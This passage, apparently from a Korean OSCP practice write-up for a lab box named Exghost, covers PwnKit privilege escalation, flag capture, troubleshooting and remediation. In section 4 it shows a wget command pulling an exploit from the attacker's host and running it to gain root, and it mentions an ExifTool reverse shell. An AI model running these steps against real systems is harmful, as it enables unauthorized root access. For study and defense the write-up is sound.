`0.105-26ubuntu1.1` = 패치(`-26ubuntu1.2`) 이전 → **취약**.

**셸을 잡자마자 칠 명령 5개:** `id` · `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `crontab -l; cat /etc/crontab`
여기서는 **SUID 목록에 `pkexec`가 있는 것**이 곧 PwnKit 후보다. 커널 5.4.0-89 + Ubuntu 20.04 조합이면 PwnKit·DirtyPipe 같은 로컬 익스플로잇을 우선 떠올린다.

### 4-2. 전송 + 무결성 확인

컴파일러가 없으므로 파이썬 PoC를 내려받는다. **md5로 무결성까지 확인**한다(Squid에서 파일이 조용히 사라진 경험 반영):

```bash
# Kali
└─$ python3 -m http.server 8000
# 타겟
www-data@exghost:/tmp$ wget -q http://192.168.45.207:8000/CVE-2021-4034.py -O /tmp/pk.py
www-data@exghost:/tmp$ md5sum /tmp/pk.py
53f43d1a285c15491ad792a100b65bb5  /tmp/pk.py        ← Kali 원본과 일치
```

> [!warning] 전송 후 반드시 `md5sum` 대조
> "다운로드 성공" 메시지가 거짓일 수 있다([[Squid]]에서 프록시가 파일을 조용히 잘라먹은 경험). Kali에서 `md5sum CVE-2021-4034.py`를 미리 찍어두고 타겟 값과 비교한다. 한 글자라도 다르면 익스플로잇이 이유 없이 실패하며, 그 원인을 익스플로잇 로직에서 찾다가 시간을 통째로 태운다.

### 4-3. 실행 → root

```bash
www-data@exghost:/tmp$ python3 /tmp/pk.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/proof.txt
1861a91dda3d6102fd70b610411b8635
```

`gid`가 33으로 남지만 `uid=0`이면 `/root` 읽기에 충분하다. ([[Levram]]의 cap_setuid와 같은 반쪽 root 형태 — uid만 0이고 gid는 원래 값)

---

## 5. 플래그

### user 플래그 — 권한상승 전에 이미 읽힌다

```bash
www-data@exghost:/var/www/html$ ls -la /home/hassan/local.txt
-rw-r--r-- 1 hassan hassan 33 ... /home/hassan/local.txt
www-data@exghost:/var/www/html$ cat /home/hassan/local.txt
025666986d0c58902b71b127c23ca5bd
```

`-rw-r--r--` = **other 읽기 가능.** 권한상승을 기다릴 필요가 없다. `/home/user/`에는 플래그가 없다.

**셸을 잡으면 즉시 모든 홈의 플래그를 시도한다.** `cat /home/*/local.txt 2>/dev/null` 한 줄. 권한이 느슨하면 user 플래그는 그 자리에서 끝난다.

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/hassan/local.txt` (`-rw-r--r--`) | `025666986d0c58902b71b127c23ca5bd` |
| `proof.txt` | `/root/proof.txt` | `1861a91dda3d6102fd70b610411b8635` |

**시험 증거 형식 연습.** 실제 시험에서는 플래그를 이렇게 한 화면에 찍어야 인정된다:
```bash
whoami; hostname; ip a; cat /root/proof.txt
```
user 플래그도 마찬가지로 `whoami; hostname; ip a; cat /home/hassan/local.txt`를 한 화면에 담는다.

---

## 6. 막혔던 지점 / 시행착오

### ① FTP는 붙는데 `LIST`가 멈춘다 — PASV/방화벽

`ftp 192.168.248.183`로 붙어 로그인은 됐는데 `ls`가 타임아웃했다. 자격증명이 틀렸나 의심했지만 아니다 — **데이터 채널 포트가 방화벽에 막혀 있었다.**

- 제어 채널(21)은 열려 있어 로그인·명령은 통한다.
- 데이터 채널은 패시브 모드에서 서버가 지정하는 고번호 포트로 나가는데, 그 포트가 전부 필터링돼 `LIST`/`RETR`이 응답을 못 받는다.
- 해결: 액티브 모드 강제 `ftp -A` (또는 파이썬 `set_pasv(False)`). 액티브 모드는 클라이언트가 포트를 열고 서버가 그리로 접속하므로 방향이 반대다.

> [!danger] "FTP 로그인 OK + LIST 멈춤" = 거의 항상 PASV 문제
> 자격증명·권한을 의심하기 전에 **모드부터 바꿔라.** 이 한 줄로 몇 분을 아낀다.

### ② 30만 건 브루트포싱 완주하고 0건 — 워드리스트의 한계

이 박스의 최대 시행착오다. `directory-list-2.3-medium.txt`(22만), `raft-medium-files.txt`×확장자(8.5만) 등 총 306,205건을 완주했는데 유의미한 결과가 `uploads`(301)·`server-status`(403)뿐이었다.

- 소요 시간이 상당했다 — 22만+8.5만 건은 rate에 따라 수십 분이 든다. 만약 여기서 "곧 나오겠지" 하고 끝까지 기다렸다면 시험 시간을 통째로 날렸을 것이다.
- 알아챈 방법: `grep -ic '^exiftest' <워드리스트>` — 표준 워드리스트 어디에도 `exiftest`가 없다는 걸 직접 확인했다(2-1). 없는 단어는 브루트포싱으로 나올 수 없다.
- 탈출구: 열린 포트가 FTP·HTTP 둘뿐 → **FTP의 backup(=pcap)이 웹 정보를 담고 있었다.**

브루트포싱을 헛돌게 하지 않으려면 필터링을 제대로 거는 것이 관건이다 — `ffuf`의 핵심 플래그:

| 플래그 | 역할 | 이 박스에서 |
|---|---|---|
| `-w <list>:FUZZ` | 워드리스트를 `FUZZ` 위치에 대입 | `directory-list-2.3-medium.txt` |
| `-e .php,.txt,.bak,...` | 각 단어에 확장자 조합 | `myFile` 엔드포인트가 `.php`라 필수였지만, 이름 자체가 목록에 없어 무의미했다 |
| `-mc all` + `-fc 403` 또는 `-fs <size>` | 상태코드/크기로 노이즈 필터 | 전부 403인 기본 vhost를 걸러야 신호가 보인다 |
| `-ac` | 자동 캘리브레이션 — 랜덤 요청으로 "가짜 200/전부-같은-크기" 자동 감지 | 이걸 안 걸면 `/uploads/` 같은 균일 응답에 파묻힌다 |

> [!warning] 필터 없이 30만 건을 돌리면 결과창이 오염돼 진짜 신호를 놓친다
> `-ac`(자동 캘리브레이션)와 `-fc/-fs`(코드·크기 필터)를 걸지 않으면 균일한 403/404가 화면을 채워, 정작 `uploads`(301) 같은 한 건을 눈으로 못 찾는다. **브루트포싱 실패의 절반은 "안 나온 것"이 아니라 "필터를 안 걸어 못 본 것"**이다.

> [!danger] 손절 시점 — 대형 워드리스트가 절반 넘게 돌았는데 커스텀스러운 결과가 0건이면 멈춰라
> "더 큰 워드리스트"가 답이 아닐 가능성을 의심하고, **다른 채널(백업/캡처/소스/JS/에러)로 전환**한다. 브루트포싱은 병렬로 백그라운드에 걸어두고 그동안 다른 서비스를 파는 것이 시간 규율이다.

### ③ curl이 응답 없이 매달렸다 — 성공 신호를 실패로 오독

`curl -F 'myFile=@image.jpg' .../exiftest.php`가 응답 없이 멈췄다. 처음엔 페이로드가 깨졌거나 서버가 죽었다고 생각했다.

실제로는 **exiftool이 리버스셸에 블록되어 PHP가 응답을 못 돌려준 것**이다. curl이 매달리는 그 순간 리스너에는 이미 셸이 붙어 있었다.

**누적 패턴 — "응답이 성공을 뜻하지 않는다".** 이 함정은 컬렉션 전체에서 반복된다: [[Crane]] 타임아웃 · [[RubyDome]] `HTTP=000` · [[Astronaut]] `200`+로그인페이지 · [[Hawat]] blind SLEEP · 여기.
**RCE 페이로드를 던졌으면 응답창이 아니라 리스너창을 봐라.** curl에 `--max-time 5`를 걸어 매달림 자체를 신호로 삼는 것도 방법이다.

### ④ 타겟에 컴파일러가 없다 — C PoC가 안 빌드됨

PwnKit 원조 PoC를 `gcc`로 빌드하려 했으나 컴파일러가 없다. 서버 박스에서 흔한 상황이다.

- 탈출구: ELF를 내장한 파이썬 PoC(`joeammond/CVE-2021-4034`) → Python만으로 실행(2-6).
- 일반 규칙: 로컬 익스플로잇은 항상 "빌드 도구 없는 타겟"을 대비해 (a) 파이썬/셸 포팅본, (b) Kali에서 `gcc -static`으로 미리 빌드한 바이너리를 준비해둔다.

### ⑤ 확장자 없는 `backup`을 이름으로 넘겨짚을 뻔

`backup`이라는 이름에 tar/zip을 기대하기 쉽다. `file backup`이 pcap이라고 알려줬다. 이름이 아니라 매직 바이트를 믿어라 — 확장자 없는 파일은 `file`부터.

만약 `file`을 건너뛰고 `tar xf backup`·`unzip backup`을 시도했다면 "손상된 아카이브" 에러를 받고 파일 자체를 의심하거나 재다운로드로 시간을 태웠을 것이다. 954 패킷짜리 pcap이 tar 헤더를 흉내 낼 리 없으니, `file` 한 줄이 그 미로를 통째로 건너뛰게 해준다.

### ⑥ "다음 후보 경로"를 미리 세워둔 것이 결정적이었다

이 박스에서 시간을 아낀 진짜 이유는 각 단계에서 실패했을 때의 대안을 미리 나열해둔 것이다:

| 지금 막힌 곳 | 준비해둔 다음 수 | 실제 결과 |
|---|---|---|
| 웹 디렉터리 열거 0건 | 열린 다른 포트(FTP)에서 정보 찾기 | ✅ pcap 발견 |
| pcap에 자격증명 없음 | 자격증명 대신 엔드포인트/파라미터/버전을 얻는다 | ✅ `myFile`+12.23 |
| `/uploads/` 리스팅 403 | 파일명 되부르기 불필요한 RCE(파싱 시 실행) 선택 | ✅ CVE-2021-22204 |
| C PoC 빌드 실패 | ELF 내장 파이썬 PoC | ✅ root |

**막다른 길에 서기 전에 "다음 후보"를 적어두라.** 시험장에서 시간을 태우는 건 실패 그 자체가 아니라 **실패한 뒤 멍하니 같은 벽을 다시 미는 것**이다. 한 경로를 시작할 때 "이게 안 되면 무엇을 볼 것인가"를 미리 한 줄 적어두면, 막히는 순간 손이 다음으로 넘어간다.

### ⑦ 리버스셸이 안 붙었다면 — 의심 순서

여기서는 9001이 한 번에 붙었지만, 안 붙었다면 순서대로:
1. 아웃바운드 포트 제한 — 9001이 막혔나? 443/80/53으로 바꿔본다([[Hawat]]는 443만 열려 있었다).
2. 페이로드 파손 — base64 디코드가 타겟에서 깨졌나? `id > /tmp/x`처럼 파일로 결과를 남겨보는 non-interactive 검증.
3. exiftool이 트리거 안 됨 — 서버가 `exiftool`을 정말 호출하는지(응답에 exif 출력이 반사되는지) 먼저 정상 이미지로 확인.
4. 방화벽/인라인 블로킹 — 연결은 열리는데 즉시 끊기면 IPS를 의심.

### 이 유형에서 흔히 막히는 지점 (원문 시행착오 외)

**원문에 실측 기록이 없어 일반 지식으로 채운 항목:**
- DjVu 페이로드가 트리거 안 됨: `bzz`·`djvumake`(djvulibre-bin 패키지)가 Kali에 없으면 페이로드를 못 만든다. `apt install djvulibre-bin` 선확인. [가정] 최신 Kali는 기본 미포함일 수 있다.
- exiftool `-config` 무시됨: `configfile` 경로가 틀리거나 `1;`(참 반환) 라인이 없으면 커스텀 태그 정의가 로드되지 않아 `-HasselbladExif` 태그 쓰기가 조용히 실패한다.
- 리버스셸 포트 선택: 아웃바운드가 막힌 박스라면 9001 대신 443/80/53을 시도한다(여기 Exghost는 9001이 통했다). [[Hawat]]는 443만 열려 있었다.

---

## 7. OSCP 시험 관점

1. **"큰 워드리스트로 안 나옴 = 없음"은 틀린 추론이다.** 30만 건 완주하고 0건이었다. `exiftest.php`는 어떤 표준 워드리스트에도 없다. **다른 채널(백업·캡처·로그·JS 번들·에러 메시지)에서 파일명을 얻거나 앱 성격에서 이름을 유추**해야 한다. 대형 브루트포싱은 백그라운드로 돌리고 그 시간에 다른 서비스를 판다.
2. **확장자 없는 파일은 `file`로 확인한다.** `backup`이 pcap이었다. 이름으로 넘겨짚으면 시간을 버린다.
3. **FTP 로그인은 되는데 `LIST`가 멈추면 PASV 문제다.** `ftp -A`(액티브 모드) 또는 `set_pasv(False)`. 자격증명을 의심하기 전에 모드부터 바꿔라.
4. **응답 문구의 차이는 열거 오라클이다.** `There is no file to upload.` vs `File uploaded successfully :)` 로 폼 파라미터명을 특정했다. 20바이트 최소 JPEG면 충분하다. 로그인 폼의 사용자 열거와 같은 원리.
5. **ExifTool은 확장자가 아니라 매직 바이트로 판별한다.** 겉은 JPEG(MIME 검증 통과), 속은 DjVu(취약 코드 경로) — 이 파서 혼동이 CVE-2021-22204의 핵심이다.
6. **RCE 페이로드 후 curl이 매달리면 성공 신호다.** 응답이 아니라 리스너를 봐라. ([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Hawat]]와 같은 누적 패턴)
7. **셸을 잡으면 즉시 `cat /home/*/local.txt`.** 여기서는 `-rw-r--r--`라 권한상승 전에 user 플래그가 나왔다. 이어서 5대 열거(`id`·`sudo -l`·`find -perm -4000`·`getcap -r /`·`crontab`).
8. **PwnKit은 파이썬 PoC를 준비해둬라.** 타겟에 컴파일러가 없는 경우가 흔하다. `joeammond/CVE-2021-4034`는 ELF를 내장해 컴파일이 불필요하다. C 전용이면 Kali에서 `gcc -static`으로 미리 빌드해 전송한다.
9. **파일 전송 후 `md5sum`으로 대조한다.** [[Squid]]에서 "다운로드 성공" 메시지가 거짓이었던 경험의 후속 조치.
10. **과거 캡처 파일은 현재 접근 불가능한 정보를 담는다.** `/`가 403이라 지금은 폼을 볼 수 없지만, pcap에는 폼 HTML·파라미터명·버전이 그대로 남아 있었다.

### ⚠️ 시험 금지 도구 관점 — 이 박스에서 쓴 도구 점검

> [!danger] 자동 익스플로잇 도구를 쓰지 않았는지 확인
> 이 박스의 익스플로잇은 전부 수동이라 시험 규칙에 안전하다 — `curl` 업로드, 수제 DjVu 페이로드, 파이썬 PoC(로컬 privesc는 금지 대상 아님), `nc` 리스너. **metasploit·sqlmap 계열을 쓴 단계가 없다.**
> 단 주의: ExifTool RCE에는 Metasploit 모듈(`exploit/unix/fileformat/exiftool_djvu_ant_perl_injection`)이 존재한다. 시험에서 이걸로 풀면 1대 한정 msf 사용권을 소진한다. 위의 수동 DjVu 빌드 절차(2-5)가 그 대안이니 그대로 따라 하면 msf 없이 동일한 페이로드를 만든다.
> 디렉터리 브루트포싱(`ffuf`)은 자동 익스플로잇이 아니라 열거 도구라 허용된다.

### 시간 배분 관점

- **웹 열거는 타임박스를 걸어라.** 대형 워드리스트가 절반 넘게 돌았는데 커스텀 결과가 0건이면 다른 서비스(FTP)로 전환한다. 브루트포싱은 백그라운드로.
- **정찰에서 backup=pcap을 30초 만에 판정**(`file` 한 줄)하고 `tshark --export-objects`로 5분 안에 엔드포인트·파라미터·버전을 다 얻는다. 이 경로를 알면 이 박스는 15~20분짜리다.
- 손절선: 웹만 파다가 막혔으면 "열린 포트 둘뿐"이라는 정황으로 즉시 FTP로 넘어간다. FTP 안 봤으면 열거를 끝낸 게 아니다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| FTP 기본 자격증명 `user:system` | 기본/약한 자격증명 제거. vsftpd 익명·기본 계정 비활성. 자격증명은 강제 로테이션 |
| 백업 파일(pcap)을 FTP 공유에 방치 | 캡처·백업·로그를 웹/FTP 접근 경로에 두지 않기. pcap에는 엔드포인트·파라미터·버전이 그대로 남는다 |
| ExifTool 12.23 (CVE-2021-22204) | 12.24 이상으로 업그레이드. 근본적으로는 신뢰할 수 없는 파일을 파싱할 때 ExifTool을 격리(컨테이너/`-noConfig`/최소권한)해서 실행 |
| 업로드 검증이 MIME/확장자만 확인 | 매직 바이트만으로 안전을 보장할 수 없다. 업로드 파일을 파서에 직접 넘기지 말고 재인코딩(`convert`로 픽셀만 추출) 후 저장. 실행 컨텍스트와 분리 |
| `shell_exec`에 파일 경로를 문자열 연결 | 외부 바이너리 호출 자체를 피하고, 불가피하면 인자를 배열로 전달(`proc_open` + 이스케이프). 업로드 디렉터리는 `noexec` |
| 응답 문구가 파라미터 존재를 흘림 | 성공/실패 응답을 동일한 일반 메시지로 통일해 열거 오라클 제거 |
| PwnKit (CVE-2021-4034) | `policykit-1`을 `0.105-26ubuntu1.2` 이상으로 패치. 임시조치로 `chmod 0755 /usr/bin/pkexec`(SUID 제거) |
| www-data가 uploads에 쓰기+실행 경로 | 업로드 처리 프로세스를 최소 권한으로 격리. AppArmor/SELinux로 exiftool 실행 프로파일 제한 |

---

## 9. 참고 자료

- CVE-2021-22204 (ExifTool DjVu ANT Perl injection): https://nvd.nist.gov/vuln/detail/CVE-2021-22204 · 원 분석 GitHub Security Lab(GHSL-2021-039)
- CVE-2021-4034 (PwnKit / pkexec): https://nvd.nist.gov/vuln/detail/CVE-2021-4034 · Qualys 원 advisory
- ELF 내장 파이썬 PoC: [joeammond/CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034)
- ExifTool 취약 범위: 7.44–12.23 (12.24에서 수정)
- DjVu 페이로드 도구: `djvulibre-bin`(`bzz`·`djvumake`)
- pcap HTTP 객체 추출: `tshark -r <file> --export-objects http,<dir>/`

## 남긴 흔적 (랩 정리용)

| 경로 | 내용 |
|---|---|
| `/var/www/html/uploads/phpM114GP.jpg` (22B) | 파라미터 브루트포싱용 더미 JPEG |
| `/var/www/html/uploads/phpBqJPfC.jpg` (604B) | 악성 CVE-2021-22204 이미지 |
| `/var/www/html/reportsexif/phpM114GP.txt` | 더미의 exif 리포트 |
| `/var/www/html/reportsexif/phpBqJPfC.txt` (0B) | 익스플로잇 트리거 시 생성 |
| `/tmp/pk.py` | PwnKit 파이썬 익스플로잇 |

삭제하지 않고 보고만 했다 — 랩 재검증에 쓸 수 있고 Stop/Revert 시 소멸한다. 타겟 원본 데이터는 수정하지 않았다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — 인용 중첩을 hex/base64로 회피, "응답이 성공을 뜻하지 않는다" 누적
- [[Crane]] · [[RubyDome]] · [[Astronaut]] — curl 매달림/응답 오독 같은 패턴
- [[Levram]] — uid만 0인 반쪽 root 형태(cap_setuid)
- [[Squid]] — 전송 후 무결성(md5) 확인의 근거가 된 경험
- [[Hub]] — 같은 컬렉션 앞 박스
- [[01. Pentest Foundations]] — Exghost 항목
